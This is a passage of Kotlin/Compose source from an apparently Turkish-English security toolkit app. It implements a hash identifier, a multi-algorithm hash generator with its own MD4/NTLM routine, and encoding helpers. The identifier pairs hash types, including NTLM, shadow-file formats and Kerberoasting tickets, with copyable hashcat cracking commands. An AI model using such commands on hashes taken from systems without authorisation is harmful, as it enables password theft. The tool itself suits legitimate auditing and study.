                    color = if (toolMode == 0) CyberGreen else TextMuted
                )
            }

            Box(
                modifier = Modifier
                    .weight(1f)
                    .clip(RoundedCornerShape(6.dp))
                    .background(if (toolMode == 1) TerminalCyan.copy(alpha = 0.2f) else androidx.compose.ui.graphics.Color.Transparent)
                    .clickable { toolMode = 1 }
                    .padding(vertical = 8.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = if (language == AppLanguage.TR) "⚡ Hashleme (Üretici)" else "⚡ Hash Generator",
                    fontSize = 11.5.sp,
                    fontWeight = if (toolMode == 1) FontWeight.Bold else FontWeight.Medium,
                    color = if (toolMode == 1) TerminalCyan else TextMuted
                )
            }
        }

        if (toolMode == 0) {
            HashIdentifierView(language)
        } else {
            HashGeneratorView(language)
        }
    }
}

@Composable
fun HashIdentifierTab(language: AppLanguage) {
    HashToolsTab(language)
}

@Composable
fun HashIdentifierView(language: AppLanguage) {
    val context = LocalContext.current
    var hashInput by remember { mutableStateOf("") }
    val trimmed = hashInput.trim()
    val entropy = calculateEntropy(trimmed)
    val candidates = identifyHashDetailed(trimmed)

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            OutlinedTextField(
                value = hashInput,
                onValueChange = { hashInput = it },
                label = { Text(if (language == AppLanguage.TR) "Hash Değerini Yapıştırın" else "Paste Hash Here") },
                trailingIcon = {
                    if (hashInput.isNotEmpty()) {
                        IconButton(onClick = { hashInput = "" }) {
                            Icon(Icons.Default.Clear, contentDescription = "Clear", tint = TextMuted)
                        }
                    }
                },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )

            if (trimmed.isNotEmpty()) {
                Spacer(modifier = Modifier.height(12.dp))
                // Quick Statistics Cards
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .clip(RoundedCornerShape(8.dp))
                            .background(SurfaceDark)
                            .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                            .padding(8.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("UZUNLUK", fontSize = 9.sp, fontFamily = FontFamily.Monospace, color = TextMuted)
                            Text("${trimmed.length} char (${trimmed.length * 4} bit)", fontSize = 11.5.sp, fontWeight = FontWeight.Bold, color = TerminalCyan)
                        }
                    }

                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .clip(RoundedCornerShape(8.dp))
                            .background(SurfaceDark)
                            .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                            .padding(8.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("ENTROPİ", fontSize = 9.sp, fontFamily = FontFamily.Monospace, color = TextMuted)
                            Text("$entropy bits/char", fontSize = 11.5.sp, fontWeight = FontWeight.Bold, color = CyberGreen)
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = if (language == AppLanguage.TR) "OLASI HASH TÜRLERİ & KIRMA BAYRAKLARI" else "POSSIBLE HASH TYPES & CRACKING FLAGS",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(8.dp))

            candidates.forEach { cand ->
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 5.dp)
                        .clip(RoundedCornerShape(10.dp))
                        .background(SurfaceDark)
                        .border(1.dp, BorderDark, RoundedCornerShape(10.dp))
                        .padding(12.dp)
                ) {
                    Column {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(text = cand.name, color = CyberGreen, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                            if (cand.hashcatMode.isNotBlank()) {
                                Box(
                                    modifier = Modifier
                                        .clip(RoundedCornerShape(4.dp))
                                        .background(TerminalCyan.copy(alpha = 0.2f))
                                        .padding(horizontal = 6.dp, vertical = 2.dp)
                                ) {
                                    Text(text = "Hashcat: ${cand.hashcatMode}", color = TerminalCyan, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                                }
                            }
                        }

                        if (cand.description.isNotBlank()) {
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(text = cand.description, color = TextSecondary, fontSize = 11.sp)
                        }

                        if (cand.crackCommand.isNotBlank()) {
                            Spacer(modifier = Modifier.height(8.dp))
                            Box(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(CodeBlockBg)
                                    .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
                                    .clickable {
                                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                        clipboard.setPrimaryClip(ClipData.newPlainText("Crack Command", cand.crackCommand))
                                        Toast.makeText(context, if (language == AppLanguage.TR) "Kırma komutu kopyalandı!" else "Cracking command copied!", Toast.LENGTH_SHORT).show()
                                    }
                                    .padding(8.dp)
                            ) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        text = cand.crackCommand,
                                        color = TextPrimary,
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 10.5.sp,
                                        modifier = Modifier.weight(1f)
                                    )
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Icon(
                                        imageVector = Icons.Default.ContentCopy,
                                        contentDescription = "Copy",
                                        tint = CyberGreen,
                                        modifier = Modifier.size(14.dp)
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun HashGeneratorView(language: AppLanguage) {
    val context = LocalContext.current
    var inputText by remember { mutableStateOf("") }
    var isUppercase by remember { mutableStateOf(false) }
    var useSalt by remember { mutableStateOf(false) }
    var saltText by remember { mutableStateOf("") }
    var saltPosition by remember { mutableStateOf("postfix") }
    var isHmac by remember { mutableStateOf(false) }
    var hmacKey by remember { mutableStateOf("") }

    val effectiveText = if (useSalt && saltText.isNotEmpty()) {
        if (saltPosition == "prefix") saltText + inputText else inputText + saltText
    } else {
        inputText
    }

    val results = remember(effectiveText, isUppercase, isHmac, hmacKey) {
        generateAllHashes(
            text = effectiveText,
            isUppercase = isUppercase,
            isHmac = isHmac,
            hmacKey = hmacKey
        )
    }

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            OutlinedTextField(
                value = inputText,
                onValueChange = { inputText = it },
                label = { Text(if (language == AppLanguage.TR) "Hashlenecek Düz Metin (Plaintext)" else "Plaintext to Hash") },
                placeholder = { Text(if (language == AppLanguage.TR) "Örn: password123, admin, token..." else "e.g. password123, admin, token...") },
                trailingIcon = {
                    if (inputText.isNotEmpty()) {
                        IconButton(onClick = { inputText = "" }) {
                            Icon(Icons.Default.Clear, contentDescription = "Clear", tint = TextMuted)
                        }
                    }
                },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = TerminalCyan,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )

            Spacer(modifier = Modifier.height(10.dp))

            // Options Row
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.clickable { isUppercase = !isUppercase }
                ) {
                    Switch(
                        checked = isUppercase,
                        onCheckedChange = { isUppercase = it },
                        colors = SwitchDefaults.colors(
                            checkedThumbColor = TerminalCyan,
                            checkedTrackColor = TerminalCyan.copy(alpha = 0.5f)
                        )
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = if (language == AppLanguage.TR) "BÜYÜK HARF" else "UPPERCASE",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        fontWeight = FontWeight.Medium
                    )
                }

                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.clickable { useSalt = !useSalt }
                ) {
                    Switch(
                        checked = useSalt,
                        onCheckedChange = { useSalt = it },
                        colors = SwitchDefaults.colors(
                            checkedThumbColor = WarningOrange,
                            checkedTrackColor = WarningOrange.copy(alpha = 0.5f)
                        )
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = if (language == AppLanguage.TR) "Salt (Tuz)" else "Salt",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        fontWeight = FontWeight.Medium
                    )
                }

                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.clickable { isHmac = !isHmac }
                ) {
                    Switch(
                        checked = isHmac,
                        onCheckedChange = { isHmac = it },
                        colors = SwitchDefaults.colors(
                            checkedThumbColor = AccentPurple,
                            checkedTrackColor = AccentPurple.copy(alpha = 0.5f)
                        )
                    )
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = "HMAC",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        fontWeight = FontWeight.Medium
                    )
                }
            }

            // Salt Inputs
            if (useSalt) {
                Spacer(modifier = Modifier.height(8.dp))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    OutlinedTextField(
                        value = saltText,
                        onValueChange = { saltText = it },
                        label = { Text(if (language == AppLanguage.TR) "Salt Değeri" else "Salt Value") },
                        modifier = Modifier.weight(1f),
                        singleLine = true,
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = WarningOrange,
                            unfocusedBorderColor = BorderDark,
                            focusedTextColor = TextPrimary,
                            unfocusedTextColor = TextPrimary
                        )
                    )

                    Row(
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(SurfaceDark)
                            .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                            .padding(2.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .background(if (saltPosition == "postfix") WarningOrange.copy(alpha = 0.25f) else androidx.compose.ui.graphics.Color.Transparent)
                                .clickable { saltPosition = "postfix" }
                                .padding(horizontal = 8.dp, vertical = 6.dp)
                        ) {
                            Text(
                                text = "Metin+Salt",
                                fontSize = 10.sp,
                                color = if (saltPosition == "postfix") WarningOrange else TextMuted
                            )
                        }
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(6.dp))
                                .background(if (saltPosition == "prefix") WarningOrange.copy(alpha = 0.25f) else androidx.compose.ui.graphics.Color.Transparent)
                                .clickable { saltPosition = "prefix" }
                                .padding(horizontal = 8.dp, vertical = 6.dp)
                        ) {
                            Text(
                                text = "Salt+Metin",
                                fontSize = 10.sp,
                                color = if (saltPosition == "prefix") WarningOrange else TextMuted
                            )
                        }
                    }
                }
            }

            // HMAC Key Input
            if (isHmac) {
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedTextField(
                    value = hmacKey,
                    onValueChange = { hmacKey = it },
                    label = { Text(if (language == AppLanguage.TR) "HMAC Gizli Anahtarı (Secret Key)" else "HMAC Secret Key") },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = AccentPurple,
                        unfocusedBorderColor = BorderDark,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    )
                )
            }

            Spacer(modifier = Modifier.height(14.dp))

            Text(
                text = if (language == AppLanguage.TR) "HESAPLANAN HASH ÇIKTILARI" else "CALCULATED HASH OUTPUTS",
                style = MaterialTheme.typography.labelLarge,
                color = TerminalCyan
            )
            Spacer(modifier = Modifier.height(8.dp))
        }

        items(results.size) { index ->
            val item = results[index]
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 4.dp)
                    .clip(RoundedCornerShape(10.dp))
                    .background(SurfaceDark)
                    .border(1.dp, BorderDark, RoundedCornerShape(10.dp))
                    .clickable {
                        if (!item.hash.startsWith("(")) {
                            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                            clipboard.setPrimaryClip(ClipData.newPlainText(item.algorithm, item.hash))
                            Toast.makeText(
                                context,
                                if (language == AppLanguage.TR) "${item.algorithm} kopyalandı!" else "${item.algorithm} copied!",
                                Toast.LENGTH_SHORT
                            ).show()
                        }
                    }
                    .padding(12.dp)
            ) {
                Column {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(
                                text = item.algorithm,
                                color = TerminalCyan,
                                fontWeight = FontWeight.Bold,
                                fontSize = 13.5.sp
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(4.dp))
                                    .background(item.tagColor.copy(alpha = 0.2f))
                                    .padding(horizontal = 6.dp, vertical = 2.dp)
                            ) {
                                Text(
                                    text = item.tag,
                                    color = item.tagColor,
                                    fontSize = 10.sp,
                                    fontFamily = FontFamily.Monospace,
                                    fontWeight = FontWeight.SemiBold
                                )
                            }
                        }

                        if (!item.hash.startsWith("(")) {
                            Icon(
                                imageVector = Icons.Default.ContentCopy,
                                contentDescription = "Copy",
                                tint = TerminalCyan,
                                modifier = Modifier.size(15.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(6.dp))

                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(6.dp))
                            .background(CodeBlockBg)
                            .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
                            .padding(8.dp)
                    ) {
                        Text(
                            text = item.hash,
                            color = if (item.hash.startsWith("(")) TextMuted else TextPrimary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.5.sp,
                            lineHeight = 16.sp
                        )
                    }
                }
            }
        }
    }
}

// -------------------------------------------------------------
// HELPER MODELS & LOGIC
// -------------------------------------------------------------

data class GeneratedHashResult(
    val algorithm: String,
    val tag: String,
    val tagColor: androidx.compose.ui.graphics.Color,
    val hash: String
)

fun generateAllHashes(
    text: String,
    isUppercase: Boolean,
    isHmac: Boolean,
    hmacKey: String
): List<GeneratedHashResult> {
    if (text.isEmpty()) {
        val emptyHint = "(Metin bekleniyor...)"
        return listOf(
            GeneratedHashResult("MD5", "128-bit", CyberGreen, emptyHint),
            GeneratedHashResult("NTLM", "Windows SAM", WarningOrange, emptyHint),
            GeneratedHashResult("SHA-1", "160-bit", TerminalCyan, emptyHint),
            GeneratedHashResult("SHA-256", "256-bit", CyberGreen, emptyHint),
            GeneratedHashResult("SHA-512", "512-bit", AccentPurple, emptyHint),
            GeneratedHashResult("SHA-384", "384-bit", TerminalCyan, emptyHint),
            GeneratedHashResult("SHA-224", "224-bit", AccentBlue, emptyHint),
            GeneratedHashResult("SHA3-256", "Keccak / Web3", AccentEmerald, emptyHint),
            GeneratedHashResult("CRC32", "32-bit Checksum", AccentYellow, emptyHint)
        )
    }

    val bytes = text.toByteArray(Charsets.UTF_8)
    val list = mutableListOf<GeneratedHashResult>()

    fun format(h: String) = if (isUppercase) h.uppercase() else h.lowercase()

    if (isHmac) {
        val keyBytes = hmacKey.toByteArray(Charsets.UTF_8)
        list.add(GeneratedHashResult("HMAC-MD5", "128-bit", CyberGreen, format(computeHmac("HmacMD5", keyBytes, bytes))))
        list.add(GeneratedHashResult("HMAC-SHA1", "160-bit", TerminalCyan, format(computeHmac("HmacSHA1", keyBytes, bytes))))
        list.add(GeneratedHashResult("HMAC-SHA256", "256-bit", CyberGreen, format(computeHmac("HmacSHA256", keyBytes, bytes))))
        list.add(GeneratedHashResult("HMAC-SHA512", "512-bit", AccentPurple, format(computeHmac("HmacSHA512", keyBytes, bytes))))
        return list
    }

    // Standard Hashes
    list.add(GeneratedHashResult("MD5", "128-bit / 32 char", CyberGreen, format(computeDigest("MD5", bytes))))

    // NTLM (UTF-16LE + MD4)
    val ntlmBytes = text.toByteArray(Charsets.UTF_16LE)
    val ntlmHex = Md4Helper.hash(ntlmBytes).joinToString("") { "%02x".format(it) }
    list.add(GeneratedHashResult("NTLM", "Windows SAM / AD", WarningOrange, format(ntlmHex)))

    list.add(GeneratedHashResult("SHA-1", "160-bit / 40 char", TerminalCyan, format(computeDigest("SHA-1", bytes))))
    list.add(GeneratedHashResult("SHA-256", "256-bit / 64 char", CyberGreen, format(computeDigest("SHA-256", bytes))))
    list.add(GeneratedHashResult("SHA-512", "512-bit / 128 char", AccentPurple, format(computeDigest("SHA-512", bytes))))
    list.add(GeneratedHashResult("SHA-384", "384-bit / 96 char", TerminalCyan, format(computeDigest("SHA-384", bytes))))
    list.add(GeneratedHashResult("SHA-224", "224-bit / 56 char", AccentBlue, format(computeDigest("SHA-224", bytes))))

    val sha3 = computeDigest("SHA3-256", bytes)
    if (!sha3.contains("Desteklenmiyor") && !sha3.contains("Unsupported")) {
        list.add(GeneratedHashResult("SHA3-256", "Keccak / Web3", AccentEmerald, format(sha3)))
    }

    val crc = java.util.zip.CRC32()
    crc.update(bytes)
    val crcHex = "%08x".format(crc.value)
    list.add(GeneratedHashResult("CRC32", "32-bit Checksum", AccentYellow, format(crcHex)))

    return list
}

fun computeDigest(algo: String, bytes: ByteArray): String {
    return try {
        val md = java.security.MessageDigest.getInstance(algo)
        md.update(bytes)
        md.digest().joinToString("") { "%02x".format(it) }
    } catch (e: Exception) {
        "Desteklenmiyor"
    }
}

fun computeHmac(algo: String, key: ByteArray, data: ByteArray): String {
    return try {
        val mac = javax.crypto.Mac.getInstance(algo)
        val secretKey = javax.crypto.spec.SecretKeySpec(key, algo)
        mac.init(secretKey)
        mac.doFinal(data).joinToString("") { "%02x".format(it) }
    } catch (e: Exception) {
        "Geçersiz anahtar"
    }
}

object Md4Helper {
    fun hash(bytes: ByteArray): ByteArray {
        var a = 0x67452301
        var b = 0xefcdab89.toInt()
        var c = 0x98badcfe.toInt()
        var d = 0x10325476

        val bitLen = bytes.size.toLong() * 8
        val padLen = if (bytes.size % 64 < 56) 56 - (bytes.size % 64) else 120 - (bytes.size % 64)
        val padded = ByteArray(bytes.size + padLen + 8)
        System.arraycopy(bytes, 0, padded, 0, bytes.size)
        padded[bytes.size] = 0x80.toByte()

        for (i in 0 until 8) {
            padded[bytes.size + padLen + i] = ((bitLen ushr (i * 8)) and 0xFF).toByte()
        }

        val x = IntArray(16)
        var offset = 0
        while (offset < padded.size) {
            for (i in 0 until 16) {
                x[i] = (padded[offset + i * 4].toInt() and 0xFF) or
                        ((padded[offset + i * 4 + 1].toInt() and 0xFF) shl 8) or
                        ((padded[offset + i * 4 + 2].toInt() and 0xFF) shl 16) or
                        ((padded[offset + i * 4 + 3].toInt() and 0xFF) shl 24)
            }

            val aa = a
            val bb = b
            val cc = c
            val dd = d

            fun rot(v: Int, s: Int) = (v shl s) or (v ushr (32 - s))
            fun f(x: Int, y: Int, z: Int) = (x and y) or (x.inv() and z)
            fun g(x: Int, y: Int, z: Int) = (x and y) or (x and z) or (y and z)
            fun h(x: Int, y: Int, z: Int) = x xor y xor z

            val s1 = intArrayOf(3, 7, 11, 19)
            for (i in 0 until 16) {
                val shift = s1[i % 4]
                when (i % 4) {
                    0 -> a = rot(a + f(b, c, d) + x[i], shift)
                    1 -> d = rot(d + f(a, b, c) + x[i], shift)
                    2 -> c = rot(c + f(d, a, b) + x[i], shift)
                    3 -> b = rot(b + f(c, d, a) + x[i], shift)
                }
            }

            val s2 = intArrayOf(3, 5, 9, 13)
            val order2 = intArrayOf(0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15)
            for (i in 0 until 16) {
                val k = order2[i]
                val shift = s2[i % 4]
                when (i % 4) {
                    0 -> a = rot(a + g(b, c, d) + x[k] + 0x5a827999, shift)
                    1 -> d = rot(d + g(a, b, c) + x[k] + 0x5a827999, shift)
                    2 -> c = rot(c + g(d, a, b) + x[k] + 0x5a827999, shift)
                    3 -> b = rot(b + g(c, d, a) + x[k] + 0x5a827999, shift)
                }
            }

            val s3 = intArrayOf(3, 9, 11, 15)
            val order3 = intArrayOf(0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15)
            for (i in 0 until 16) {
                val k = order3[i]
                val shift = s3[i % 4]
                when (i % 4) {
                    0 -> a = rot(a + h(b, c, d) + x[k] + 0x6ed9eba1, shift)
                    1 -> d = rot(d + h(a, b, c) + x[k] + 0x6ed9eba1, shift)
                    2 -> c = rot(c + h(d, a, b) + x[k] + 0x6ed9eba1, shift)
                    3 -> b = rot(b + h(c, d, a) + x[k] + 0x6ed9eba1, shift)
                }
            }

            a += aa
            b += bb
            c += cc
            d += dd
            offset += 64
        }

        val res = ByteArray(16)
        for (i in 0 until 4) {
            res[i] = (a ushr (i * 8)).toByte()
            res[i + 4] = (b ushr (i * 8)).toByte()
            res[i + 8] = (c ushr (i * 8)).toByte()
            res[i + 12] = (d ushr (i * 8)).toByte()
        }
        return res
    }
}

data class HashCandidate(
    val name: String,
    val description: String = "",
    val hashcatMode: String = "",
    val crackCommand: String = ""
)

fun calculateEntropy(s: String): Double {
    if (s.isEmpty()) return 0.0
    val map = mutableMapOf<Char, Int>()
    s.forEach { map[it] = (map[it] ?: 0) + 1 }
    var entropy = 0.0
    val len = s.length.toDouble()
    for ((_, count) in map) {
        val p = count / len
        entropy -= p * (Math.log(p) / Math.log(2.0))
    }
    return (entropy * 100).toInt() / 100.0
}

fun convertIpv4(ip: String): Map<String, String> {
    val parts = ip.trim().split(".")
    if (parts.size != 4) return emptyMap()
    val octets = parts.mapNotNull { it.toIntOrNull() }
    if (octets.size != 4 || octets.any { it !in 0..255 }) return emptyMap()
    val dec = (octets[0].toLong() shl 24) or (octets[1].toLong() shl 16) or (octets[2].toLong() shl 8) or octets[3].toLong()
    val hex = "0x" + octets.joinToString("") { String.format("%02X", it) }
    val octal = octets.joinToString(".") { String.format("%04o", it) }
    val binary = octets.joinToString(".") { Integer.toBinaryString(it).padStart(8, '0') }
    return mapOf(
        "Decimal (DWORD)" to dec.toString(),
        "Hexadecimal" to hex,
        "Octal" to octal,
        "Binary" to binary
    )
}

fun rot13(input: String): String {
    return input.map { c ->
        when (c) {
            in 'a'..'z' -> ((c - 'a' + 13) % 26 + 'a'.code).toChar()
            in 'A'..'Z' -> ((c - 'A' + 13) % 26 + 'A'.code).toChar()
            else -> c
        }
    }.joinToString("")
}

fun stringToHex(s: String, spaceSeparated: Boolean): String {
    return s.toByteArray(Charsets.UTF_8).joinToString(if (spaceSeparated) " " else "") {
        String.format("%02x", it)
    }
}

fun hexToString(hex: String): String {
    val clean = hex.replace(" ", "").replace("0x", "").replace(":", "")
    if (clean.length % 2 != 0) return "Geçersiz Hex (tek sayıda karakter)"
    return try {
        val bytes = ByteArray(clean.length / 2)
        for (i in bytes.indices) {
            bytes[i] = clean.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        }
        String(bytes, Charsets.UTF_8)
    } catch (e: Exception) {
        "Geçersiz Hex baytları"
    }
}

fun htmlEntityEncode(s: String): String {
    return s.map { c ->
        when (c) {
            '<' -> "&lt;"
            '>' -> "&gt;"
            '&' -> "&amp;"
            '"' -> "&quot;"
            '\'' -> "&#39;"
            '/' -> "&#x2F;"
            else -> c.toString()
        }
    }.joinToString("")
}

fun htmlEntityDecode(s: String): String {
    return s.replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#x2F;", "/")
}

fun identifyHashDetailed(hash: String): List<HashCandidate> {
    if (hash.isEmpty()) return listOf(HashCandidate("Girdi bekleniyor...", "Lütfen tanımlamak istediğiniz hash değerini yapıştırın."))
    val len = hash.length
    val isHex = hash.matches(Regex("^[0-9a-fA-F]+$"))
    val list = mutableListOf<HashCandidate>()

    if (isHex) {
        when (len) {
            32 -> {
                list.add(HashCandidate("MD5", "Eski ve yaygın 128-bit hash", "-m 0", "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("NTLM", "Windows yerel parola hash formatı", "-m 1000", "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("MD4", "Eski Windows & NTLM temeli", "-m 900", "hashcat -m 900 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            40 -> {
                list.add(HashCandidate("SHA-1", "160-bit kriptografik özet", "-m 100", "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("MySQL 4.1/5+", "MySQL veritabanı parola hash'i", "-m 300", "hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            56 -> {
                list.add(HashCandidate("SHA-224", "224-bit SHA-2 ailesi", "-m 1300", "hashcat -m 1300 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            64 -> {
                list.add(HashCandidate("SHA-256", "Modern standart 256-bit hash", "-m 1400", "hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("Keccak-256", "Ethereum / Web3 hash formatı", "-m 17700", "hashcat -m 17700 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            96 -> {
                list.add(HashCandidate("SHA-384", "384-bit SHA-2 ailesi", "-m 10800", "hashcat -m 10800 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
            128 -> {
                list.add(HashCandidate("SHA-512", "512-bit güçlü kriptografik özet", "-m 1700", "hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt"))
                list.add(HashCandidate("Whirlpool", "512-bit blok şifre tabanlı hash", "-m 6100", "hashcat -m 6100 hashes.txt /usr/share/wordlists/rockyou.txt"))
            }
        }
    }

    if (hash.startsWith("$2a$") || hash.startsWith("$2b$") || hash.startsWith("$2y$")) {
        list.add(HashCandidate("bcrypt", "Blowfish tabanlı yavaş hash algoritması", "-m 3200", "hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("$6$")) {
        list.add(HashCandidate("SHA512-Crypt", "Linux /etc/shadow varsayılan parola formatı", "-m 1800", "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("$1$")) {
        list.add(HashCandidate("MD5-Crypt", "Eski Linux /etc/shadow parola formatı", "-m 500", "hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("\$krb5asrep\$")) {
        list.add(HashCandidate("Kerberos 5 AS-REP", "AS-REP Roasting saldırı çıktısı", "-m 18200", "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }
    if (hash.startsWith("\$krb5tgs\$")) {
        list.add(HashCandidate("Kerberos 5 TGS", "Kerberoasting SPN servis bileti hash'i", "-m 13100", "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"))
    }

    if (list.isEmpty()) {
        list.add(HashCandidate("Bilinmeyen İmza", "Uzunluk: $len karakter. Özel tuzlama (salt) veya tescilli algoritma olabilir."))
    }
    return list
}
